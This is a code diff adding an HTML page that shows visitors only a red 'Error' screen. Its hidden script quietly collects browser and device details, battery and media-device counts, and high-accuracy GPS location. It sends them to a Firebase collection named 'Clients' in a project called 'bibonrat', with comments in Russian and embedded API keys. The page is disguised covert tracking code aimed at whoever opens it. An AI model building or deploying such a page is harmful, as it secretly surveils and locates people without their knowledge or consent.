@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Error</title>
+</head>
+
+<body style="margin:0; padding:0; background:black;">
+
+    <div style="
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: black;
+            color: red;
+            font-family: Arial, sans-serif;
+            font-weight: bold;
+            font-size: 12px;
+            text-align: center;
+         ">
+
+        <div style="margin-bottom: 15px; letter-spacing: 3px;">
+            A.&middot;.L.&middot;.G.&middot;.D.&middot;.G.&middot;.A.&middot;.D.&middot;.U.&middot;.
+        </div>
+
+        <div style="
+            font-size: 40px;
+            color: #ff0000;
+            text-shadow: 0 0 10px red, 0 0 20px red;
+        ">
+            Error
+        </div>
+
+    </div>
+    <!-- ✅ СКРЫТЫЕ ЭЛЕМЕНТЫ, ЧТОБЫ КОД НЕ ПАДАЛ -->
+    <div id="authStatus" style="display:none"></div>
+    <div id="locationStatus" style="display:none"></div>
+    <div id="firestoreStatus" style="display:none"></div>
+    <table style="display:none"><tbody id="infoBody"></tbody></table>
+
+
+    <!-- ВАЖНО: Modular Firebase SDK (пишем в именованную БД fishbibon) -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+        import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
+        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+
+        // 🔑 Конфигурация Firebase (твои ключи)
+        const firebaseConfig = {
+            apiKey: "AIzaSyAQlLh2Abk92sZVCSsYSCxvps4Uld3C1Lk",
+            authDomain: "bibonrat.firebaseapp.com",
+            databaseURL: "https://bibonrat-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "bibonrat",
+            storageBucket: "bibonrat.firebasestorage.app",
+            messagingSenderId: "78759159251",
+            appId: "1:78759159251:web:3e40d7d5a2aa762f01bb26"
+        };
+
+        // ✅ ИНИЦИАЛИЗАЦИЯ
+        const app = initializeApp(firebaseConfig);
+
+        // ✅ ВЫБИРАЕМ ИМЕННО БАЗУ Firestore: fishbibon (а не default)
+        const DB_NAME = "fishbibon";
+        const db = getFirestore(app, DB_NAME);
+
+        // ✅ Auth (анонимно) — чтобы правила request.auth != null пропускали запись
+        const auth = getAuth(app);
+
+        // Коллекция для сохранения
+        const COLLECTION_NAME = "Clients";
+
+        // DOM
+        const infoBody = document.getElementById("infoBody");
+        const locationStatus = document.getElementById("locationStatus");
+        const firestoreStatus = document.getElementById("firestoreStatus");
+        const authStatus = document.getElementById("authStatus");
+
+        // Хранилище данных
+        const collectedData = {};
+
+        function setStatus(el, type, text) {
+            el.className = "status " + type;
+            el.innerText = text;
+        }
+
+        function addInfo(label, value) {
+            if (value === undefined || value === null) value = "недоступно";
+            const row = document.createElement("tr");
+            row.innerHTML = `<td>${label}</td><td>${value}</td>`;
+            infoBody.appendChild(row);
+            collectedData[label] = value;
+        }
+
+        // Ждём авторизацию (без неё будет Missing or insufficient permissions)
+        let authReadyResolve;
+        const authReady = new Promise((res) => (authReadyResolve = res));
+
+        async function initAuth() {
+            try {
+                const cred = await signInAnonymously(auth);
+                const uid = cred?.user?.uid || "unknown";
+                addInfo("Firebase UID", uid);
+                setStatus(authStatus, "success", "✅ Firebase авторизация (анонимно) успешна");
+                authReadyResolve(true);
+            } catch (error) {
+                console.error("Ошибка авторизации:", error);
+                setStatus(authStatus, "error", "❌ Ошибка Firebase авторизации: " + (error?.message || error));
+                firestoreStatus.innerHTML = "⚠️ Запись в Firestore невозможна без авторизации.";
+                firestoreStatus.style.color = "red";
+                authReadyResolve(false);
+            }
+        }
+
+        async function saveToFirestore(data) {
+            const ok = await authReady;
+            if (!ok) return;
+
+            try {
+                data.timestamp = new Date().toISOString();
+                data.pageUrl = location.href;
+                data.firestoreDb = DB_NAME;
+
+                const docRef = await addDoc(collection(db, COLLECTION_NAME), data);
+
+                console.log("Saved to fishbibon. Doc ID:", docRef.id);
+                firestoreStatus.innerHTML = `✅ Данные сохранены в Firestore "${DB_NAME}" (ID: ${docRef.id})`;
+                firestoreStatus.style.color = "green";
+            } catch (error) {
+                console.error("Ошибка при записи в Firestore:", error);
+                firestoreStatus.innerHTML = `❌ Ошибка сохранения: ${error?.message || error}`;
+                firestoreStatus.style.color = "red";
+            }
+        }
+
+        // Главная логика
+        (async function main() {
+            // 0) Авторизация
+            initAuth();
+
+            // 1) Базовые данные
+            addInfo("User Agent", navigator.userAgent);
+            addInfo("Платформа", navigator.platform);
+            addInfo("Язык", navigator.language);
+            addInfo("Разрешение экрана", `${screen.width} x ${screen.height}`);
+            addInfo("Глубина цвета", `${screen.colorDepth} бит`);
+            addInfo("Временная зона", Intl.DateTimeFormat().resolvedOptions().timeZone);
+            addInfo("Включён ли cookie", navigator.cookieEnabled ? "Да" : "Нет");
+
+            // 2) CPU и память
+            addInfo("Ядра CPU", navigator.hardwareConcurrency || "не поддерживается");
+            addInfo("ОЗУ устройства", navigator.deviceMemory ? navigator.deviceMemory + " GB" : "недоступно");
+
+            // 3) Информация о сети
+            if (navigator.connection) {
+                const conn = navigator.connection;
+                addInfo("Тип сети", conn.effectiveType || "неизвестно");
+                addInfo("RTT (ms)", conn.rtt || "неизвестно");
+                addInfo("Скорость загрузки (Mbps)", conn.downlink || "неизвестно");
+                addInfo("Экономия данных", conn.saveData ? "включена" : "отключена");
+            } else {
+                addInfo("Информация о сети", "не поддерживается");
+            }
+
+            // 4) Информация о батарее
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    addInfo("Уровень заряда", (battery.level * 100).toFixed(0) + "%");
+                    addInfo("Заряжается", battery.charging ? "Да" : "Нет");
+                    if (!battery.charging && battery.dischargingTime !== Infinity) {
+                        addInfo("Время до разрядки", (battery.dischargingTime / 60).toFixed(0) + " мин");
+                    }
+                } catch (e) {
+                    addInfo("Статус батареи", "ошибка доступа");
+                }
+            } else {
+                addInfo("Battery API", "не поддерживается");
+            }
+
+            // 5) Медиа-устройства
+            if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+                try {
+                    const devices = await navigator.mediaDevices.enumerateDevices();
+                    const video = devices.filter(d => d.kind === "videoinput").length;
+                    const audio = devices.filter(d => d.kind === "audioinput").length;
+                    addInfo("Камеры", video);
+                    addInfo("Микрофоны", audio);
+                } catch (e) {
+                    addInfo("Медиа-устройства", "не определены");
+                }
+            } else {
+                addInfo("enumerateDevices", "не поддерживается");
+            }
+
+            // 6) Геолокация (GPS)
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        const { latitude, longitude, accuracy } = position.coords;
+                        addInfo("Широта", latitude.toFixed(6));
+                        addInfo("Долгота", longitude.toFixed(6));
+                        addInfo("Точность GPS", accuracy.toFixed(1) + " м");
+
+                        setStatus(locationStatus, "success", "✅ Геолокация получена");
+                        await saveToFirestore(collectedData);
+                    },
+                    async (error) => {
+                        let msg = "";
+                        switch (error.code) {
+                            case error.PERMISSION_DENIED: msg = "❌ Доступ к геолокации запрещён"; break;
+                            case error.POSITION_UNAVAILABLE: msg = "❌ Позиция недоступна"; break;
+                            case error.TIMEOUT: msg = "❌ Таймаут геолокации"; break;
+                            default: msg = "❌ Неизвестная ошибка геолокации";
+                        }
+
+                        addInfo("Геолокация", msg);
+                        setStatus(locationStatus, "error", msg);
+
+                        await saveToFirestore(collectedData);
+                    },
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            } else {
+                addInfo("Геолокация", "не поддерживается браузером");
+                setStatus(locationStatus, "error", "❌ Геолокация не поддерживается");
+                await saveToFirestore(collectedData);
+            }
+        })();
+    </script>
+</body>
+</html>
